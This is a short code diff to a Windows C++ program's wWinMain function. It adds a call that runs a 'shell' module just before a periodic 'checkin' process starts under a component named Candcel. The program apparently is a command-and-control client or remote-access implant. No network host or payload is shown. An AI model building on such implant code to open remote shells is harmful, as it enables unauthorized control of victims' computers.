@@ -55,6 +55,8 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
 	Amendux::Candcel::Init();
 	Amendux::ModuleLoader::Init();
 
+	Amendux::ModuleLoader::Current()->RunModule(L"shell");
+
 	// Launch the checkin process
 	Amendux::Candcel::SpawnInterval(Amendux::Candcel::Current());
 
